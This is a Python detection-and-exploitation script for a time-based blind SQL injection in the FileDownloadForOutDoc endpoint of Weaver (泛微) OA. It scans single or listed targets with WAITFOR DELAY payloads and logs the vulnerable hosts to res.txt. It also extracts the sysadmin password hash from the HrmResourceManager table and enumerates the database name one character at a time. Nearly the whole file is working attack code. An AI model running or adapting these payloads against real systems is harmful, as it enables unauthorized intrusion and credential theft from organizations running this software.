import argparse
import random
import requests

class colors:
    # 定义颜色代码
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

banner = """
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.11
    泛微OA FileDownloadForOutDoc reception SQL inject 检测利用脚本
"""

#根据泛微默认表进行密码遍历功能
def exp_passwd(url, username):
    print(colors.END + "遍历泛微默认数据库密码模块")
    str_list = "qwertyuioplkjhgfdsazxcvbnm@._1234567890$QWERTYUIOPLKJHGFDSAZXCVBNM"
    list_passwd = ""
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "127.0.0.1:9999/wui/index.html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "45"
    }
    for j in range(1, 35):
        for i in str_list:
            fileid = random.randint(1000, 999999)
            data = f"fileid={fileid}+IF ASCII(SUBSTRING((select password from HrmResourceManager where loginid='sysadmin'), {j}, 1))={ord(i)} WAITFOR DELAY+'0:0:5'&isFromOutImg=1"
            try:
                response = requests.post(url=str(url) + "/weaver/weaver.file.FileDownloadForOutDoc", headers=header, data=data)

                if response.elapsed.total_seconds() >= 5:
                    list_passwd += i
                    print(colors.GREEN + f"遍历中 : 第{j}个字符  ---->  {i}")
                    break
            except Exception as e:
                print(colors.RED + f"ERROR : {e}")
    print(colors.RED + f"密文 ： {list_passwd}")

#检测mssql注入
def poc(url):
    host = url.replace("https://","".replace("http://",""))
    header = {
        "Host": f"{host}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "127.0.0.1:9999/wui/index.html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "45"
    }
    try:
        print(colors.END + f"INFO : 执行mssql延时测试 -->  {url}")
        poc_url = str(url) + "/weaver/weaver.file.FileDownloadForOutDoc"
        data = f"isFromOutImg=1&fileid={int(random.randint(1000, 99999))}+WAITFOR+DELAY+'0:0:5'"
        response = requests.post(url=poc_url, headers=header, data=data, timeout=10)
        # print(data)
        if response.elapsed.total_seconds() >= 5:
            print(colors.GREEN+f"存在FileDownloadForOutDoc SQL注入 --> {url}")
            f = open("res.txt","a+")
            f.write(poc_url)
            f.write("\n")
            f.close()
    except Exception as e:
        print(colors.RED + f"ERROR : {e}")

#遍历数据库名功能
def exp_database(url):
    print(colors.END + "遍历泛微默认数据库模块")
    db_name = ""
    str_list = "qwertyuioplkjhgfdsazxcvbnm@._1234567890$QWERTYUIOPLKJHGFDSAZXCVBNM"
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "127.0.0.1:9999/wui/index.html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "45"
    }
    for j in range(1, 10):
        for i in str_list:
            exp_url = str(url) + f"/weaver/weaver.file.FileDownloadForOutDoc"
            exp_data = f"isFromOutImg=1&fileid={int(random.randint(1000, 999999))} IF ASCII(SUBSTRING(DB_name(), {j}, 1))={ord(i)} WAITFOR DELAY '0:0:5'"
            try:
                response = requests.post(url=exp_url, headers=header, data=exp_data, verify=False, timeout=15)
                if response.elapsed.total_seconds() >= 5:
                    db_name += i
                    print(colors.GREEN + f"遍历中，当前已爆破成功字段：{i}")
                    break
            except Exception as e:
                print(colors.RED + f"ERROR {e}")
    if len(db_name) > 0:
        print(colors.RED + f'当前数据库为：{db_name}' )
    else:
        print(colors.RED + "未遍历出数据库名称")

def main():
    parser = argparse.ArgumentParser(description='''泛微OA FileDownloadForOutDoc reception SQL inject ''')
    parser.add_argument('-u', '-url', dest="url", type=str, help="单个url检测，eg:http://www.qax.com", required=False)
    parser.add_argument('-f', '-file', dest="file", nargs='?', type=str, help="多个目标检测，以文件的形式存储，文件的格式为:http://www.qax.com", required=False)
    parser.add_argument('-e', '-exp', dest='exp', default="1", nargs='?', help="使用exp遍历数据库sysadmin的密码hash值", required=False)
    parser.add_argument('-db', '-database', dest='database', nargs='?', default="mssql", help="使用exp进行遍历当前数据库名", required=False)

    url_arg = parser.parse_args().url
    file_arg = parser.parse_args().file
    exp_arg = parser.parse_args().exp
    database_arg = parser.parse_args().database
    if url_arg is None and file_arg is None:
        print(colors.END + "请使用命令-h查看命令使用帮助 --by FeiNiao")

    elif exp_arg == '1' and url_arg is not None and database_arg =='mssql':
        poc(url_arg)

    elif file_arg is not None and url_arg is None:
        file = open(file_arg).readlines()
        j = 1
        for i in file:
            print(colors.END + f"第{j}条",end=" ")
            poc(i.replace("\n",""))
            j += 1
        print(colors.GREEN + "结果存储在当前目录下的 res.txt 文件中")

    elif exp_arg != '1' and url_arg is not None and database_arg == "mssql":
        exp_passwd(url_arg,'sysadmin')

    elif exp_arg == '1' and url_arg is not None and (database_arg !="mssql" or file_arg =="1"):
        exp_database(url_arg)

    else:
        print(colors.YELLOW +  "请仔细阅读操作手册")

if __name__ == '__main__':
    print(colors.END + banner)
    main()
